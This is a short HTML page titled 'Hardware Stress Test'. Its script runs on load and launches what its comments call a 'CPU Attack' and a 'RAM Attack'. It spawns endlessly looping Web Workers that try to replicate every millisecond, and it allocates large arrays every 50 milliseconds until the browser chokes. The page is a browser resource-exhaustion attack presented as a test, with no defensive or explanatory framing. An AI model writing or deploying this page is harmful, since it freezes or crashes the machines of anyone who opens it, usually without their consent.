<!DOCTYPE html>
<html>
<head>
    <title>Hardware Stress Test</title>
</head>
<body>
    <h1 id="status">Initializing...</h1>
    
    <script>
        // 1. CPU Attack: Recursive Worker Spawning
        const workerCode = `
            onmessage = function() {
                setInterval(() => {
                    const b = new Blob([this.toString()], {type: 'text/javascript'});
                    new Worker(URL.createObjectURL(b)).postMessage('go');
                }, 1);
                while(true) { Math.sqrt(Math.random()); } // Max out CPU thread
            }
        `;
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);

        // 2. RAM Attack: Rapid Memory Allocation
        let storage = [];
        function eatMemory() {
            // Allocates large chunks of memory rapidly
            setInterval(() => {
                const chunk = new Array(1000000).fill("💥".repeat(100));
                storage.push(chunk);
                document.getElementById('status').innerText = "Memory Pressure: HIGH";
            }, 50);
        }

        // Trigger both
        function start() {
            for(let i = 0; i < 20; i++) { // Initial burst of workers
                new Worker(url).postMessage('go');
            }
            eatMemory();
        }

        start();
    </script>
</body>
</html>
